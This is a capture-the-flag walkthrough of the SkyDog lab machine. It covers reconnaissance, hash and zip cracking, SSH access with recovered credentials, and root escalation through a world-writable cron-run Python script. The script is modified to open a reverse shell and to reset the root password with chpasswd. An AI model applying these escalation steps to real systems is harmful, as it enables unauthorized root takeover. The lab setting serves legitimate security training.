## 1. Network Discovery

I first scanned the local network to identify active hosts.

```bash
nmap -sn 192.168.56.0/24
```

This identified the victim machine with the IP address:

```text
192.168.56.117
```

I then added the IP address to `/etc/hosts` to use the hostname `skydog` instead of repeatedly entering the IP address.

```bash
sudo nano /etc/hosts
```

## 2. Initial Nmap Scan

Next, I performed a full port scan with service and default script detection.

```bash
nmap -p- -sV -sC skydog
```

The scan identified two open ports:

```text
PORT   STATE SERVICE
22/tcp open  ssh    OpenSSH 6.6.1p1
80/tcp open  http   Apache httpd 2.4.7
```

Port 22 provided SSH access, while port 80 hosted a web application.

---

## 3. Searching for Known Exploits

I checked whether the identified service versions had publicly available exploits using `searchsploit`.

However, I did not find anything useful, so I continued investigating the HTTP service.

---

# Web Enumeration

## 4. Investigating the Web Page

I opened the HTTP service in a web browser and found a page containing an image.

I initially checked the page source code but did not find anything interesting. Therefore, I downloaded the image and examined its metadata using `exiftool`.

```bash
exiftool SkyDogCon_CTF.jpg
```

The metadata contained the following flag:

```text
flag{abc40a2d4e023b42bd1ff04891549ae2}
```

I identified the value inside the flag as a hash and used CrackStation to crack it.

**Result:**

```text
Welcome Home
```

---

## 5. Directory Enumeration

Next, I searched for hidden directories and files using `dirb`.

```bash
dirb http://192.168.56.117/
```

During enumeration, I discovered a `robots.txt` file.

After accessing it, I found another flag:

```text
flag{cd4f10fcba234f0e8b2f60a490c306e6}
```

I cracked the hash using CrackStation.

**Result:**

```text
Bots
```

The `robots.txt` file also contained several directories. One interesting directory was:

```text
/Setec/Astronomy
```

![](attachments/Pasted%20image%2020260906172649.png)

## 6. Investigating `/Setec/Astronomy`

After navigating to:

```text
/Setec/Astronomy
```

I found two files:

- A ZIP file
    
- A JPG image
    

I downloaded both files and examined the image using `exiftool`, but no useful information was found.

The ZIP file, however, was password protected.

---

## 7. Cracking the ZIP Password

I used `fcrackzip` with the RockYou wordlist to crack the password.

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt Whistler.zip
```

The password was successfully identified as:

```text
yourmother
```

I then extracted the ZIP file.

```bash
unzip Whistler.zip
```

This extracted two files:

```text
flag.txt
QuesttoFindCosmo.txt
```

I read their contents.

```bash
cat flag.txt
flag{1871a3c1da602bf471d3d76cc60cdb9b}

cat QuesttoFindCosmo.txt
Time to break out those binoculars and start doing some OSINT
```

I cracked the hash from the flag using CrackStation.

**Result:**

```text
yourmother
```

---

# OSINT and Custom Wordlist Creation

## 8. Investigating `/Setec`

I navigated to:

```text
/Setec
```

I checked the page source code and found the following clue:

```text
NSA-Agent-Abbott"; AKA Darth Vader
```

I searched for this clue online and found an IMDb page related to the character.

I then used CeWL to create a custom wordlist based on words from the IMDb page.
![](attachments/Pasted%20image%2020260930212306.png)

```bash
┌──(kali㉿hashi)-[~/Downloads]
└─$ cewl -d 0 -u 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' 'https://en.wikipedia.org/wiki/Sneakers_(1992_film)' > skydog1.txt

```

This generated a custom wordlist for further directory enumeration.

---

## 9. Finding `/PlayTonics`


I used the generated wordlist with `dirb` to search for additional hidden directories.

```bash
┌──(kali㉿hashi)-[~/Downloads]
└─$ dirb http://skydog  skydog1.txt 

```

This revealed the following directory:

```text
/PlayTonics
```

After navigating there, I found:

- A flag
    
- A PCAP file
    
![](attachments/Pasted%20image%2020260906181638.png)

The flag was:

```text
flag{c07908a705c22922e6d416e0e1107d99}
```

After cracking the hash, the result was:

```text
leroybrown
```

---

# PCAP Analysis

## 10. Extracting Information from the PCAP

I analysed the PCAP file and extracted an MP3 file from the captured traffic.

The audio contained the following message:

> Hi. My Name Is Werner Brandes. My Voice Is My Passport. Verify Me.

This provided a strong clue that the username was:

```text
wernerbrandes
```

---

# Initial Access

## 11. SSH Login

I attempted to log in through SSH using:

- **Username:** `wernerbrandes`
    
- **Password:** `leroybrown`
    

```bash
ssh wernerbrandes@skydog
```

The login was successful.

After gaining access, I found another flag:

```text
flag{82ce8d8f5745ff6849fa7af1473c9b35}
```

---

# Privilege Escalation Enumeration

## 12. Checking Sudo Permissions

I first checked whether the current user had any sudo permissions.

```bash
sudo -l
```

No useful sudo permissions were available.

---

## 13. Checking the Kernel Version

I checked the Linux kernel version to investigate potential kernel exploits.

```bash
uname -r
```

However, I did not find a useful exploit for the identified kernel version.

---

## 14. Checking SUID Binaries

Next, I searched for files with the SUID permission set.

```bash
find / -perm -u=s -type f 2>/dev/null
```

I investigated several binaries and tested possible techniques from GTFOBins, but none of them resulted in privilege escalation.

---

# Using LinPEAS

## 15. Automated Privilege Escalation Enumeration

Since manual enumeration did not reveal a clear attack path, I used LinPEAS to perform additional privilege escalation checks.

LinPEAS automatically checks for potential weaknesses such as:

- SUID binaries
    
- Writable files
    
- Cron jobs
    
- Credentials
    
- Misconfigurations
    
- Kernel information
    

I downloaded LinPEAS on my Kali machine.

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

I then started a Python HTTP server to transfer the file to the victim machine.

```bash
python -m http.server 8080
```

On the victim machine, I downloaded the script.

```bash
wget http://192.168.56.102:8080/linpeas.sh
```

I gave the script execution permissions.

```bash
chmod +x linpeas.sh
```

Finally, I executed it.

```bash
./linpeas.sh
```

LinPEAS revealed several interesting findings, including information related to the `wernerbrandes` environment.

![](attachments/Pasted%20image%2020260906183600.png)

# Discovering a Writable Python Script

## 16. Investigating `sanitizer.py`

I navigated to `/tmp` and discovered an interesting file:

```bash
ls -lah /lib/log/sanitizer.py
-rwxrwxrwx 1 root root 96 Oct 27 2015 /lib/log/sanitizer.py
```

The file was owned by `root` but was writable by all users, making it a potential privilege escalation vector.

I examined its contents.

```bash
cat /lib/log/sanitizer.py
```

The script contained:

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

The insecure permissions allowed the `wernerbrandes` user to modify a script that appeared to be executed automatically by the system.

---

# Method 1: Reverse Shell Privilege Escalation

## 17. Modifying the Script

I added a reverse shell payload to:

```text
/lib/log/sanitizer.py
```

I edited the file using:

```bash
nano /lib/log/sanitizer.py
```

On my Kali machine, I started a Netcat listener.

```bash
nc -nlvp 1234
```

After the modified script was automatically executed, I received a reverse shell.

I then verified my privileges.

```
# whoami
root
# ls
BlackBox
# cd BlackBox
# ls
flag.txt
# cat flag.txt
flag{b70b205c96270be6ced772112e7dd03f}

Congratulations!! Martin Bishop is a free man once again!  Go here to receive your reward.
/CongratulationsYouDidIt# and when i go inside this subfolder i see a mp4 sayong your the best
```


![](attachments/Pasted%20image%2020261001091829.png)


![](attachments/Pasted%20image%2020261001091852.png)

YAYYYY!!!!!!

![](attachments/Pasted%20image%2020261001092336.png)

![](attachments/Pasted%20image%2020261001092400.png)

# Method 2:Alternative Privilege Escalation Method

Rather addind a reverse shell i can edit the sanitizer.py file in another way
so the file contained

```
wernerbrandes@skydogctf:/tmp$ cat /lib/log/sanitizer.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

and i edited this part with previously identified /etc/passwd in suid binaried

```
os.system('echo "root:12345678" | chpasswd')
```
and then i navigated to 
`wernerbrandes@skydogctf:/$ cd /etc/cron.daily`
and logged to root
`su root`

Cron.daily jobs don't run instantly or continuously — they run on a schedule (often via `anacron`, once every 24 hours, frequently overnight/early morning)


so it would take some time and later when i try to log into root again it works
